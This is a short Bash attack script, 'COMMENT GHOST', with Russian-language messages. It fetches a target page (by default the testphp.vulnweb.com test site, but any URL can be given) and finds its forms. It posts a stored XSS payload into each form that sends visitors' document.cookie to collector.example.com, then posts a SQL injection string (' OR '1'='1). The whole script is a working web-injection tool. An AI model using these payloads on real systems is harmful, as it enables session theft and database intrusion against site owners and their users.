#!/bin/bash
TARGET=${1:-"http://testphp.vulnweb.com"}
echo "╔══════════════════════════════════════════════╗"
echo "║   👻 COMMENT GHOST — Внедрение через коммент║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# Ищем формы комментариев
echo "[COMMENT] 🔍 Ищу формы комментариев..."
curl -sk --max-time 5 "$TARGET" -o /tmp/comment_site.html 2>/dev/null

# Ищем формы
FORMS=$(grep -oP '<form[^>]+action="\K[^"]+' /tmp/comment_site.html 2>/dev/null | head -5)
for form in $FORMS; do
    echo "  📝 Форма: $form"

    # Пробуем внедрить XSS через комментарий
    curl -sk --max-time 5 -X POST \
        -d "comment=<script>fetch('https://collector.example.com/bug?id=comment_$(date +%s)&c='+document.cookie)</script>&submit=1" \
        "$TARGET/$form" \
        -o /dev/null -w "  📡 XSS инъекция: HTTP %{http_code}\n" 2>/dev/null

    # Пробуем внедрить SQLi через комментарий
    curl -sk --max-time 5 -X POST \
        -d "comment=' OR '1'='1&submit=1" \
        "$TARGET/$form" \
        -o /dev/null -w "  📡 SQLi инъекция: HTTP %{http_code}\n" 2>/dev/null
done

echo "[COMMENT] ✅ Анализ завершён"
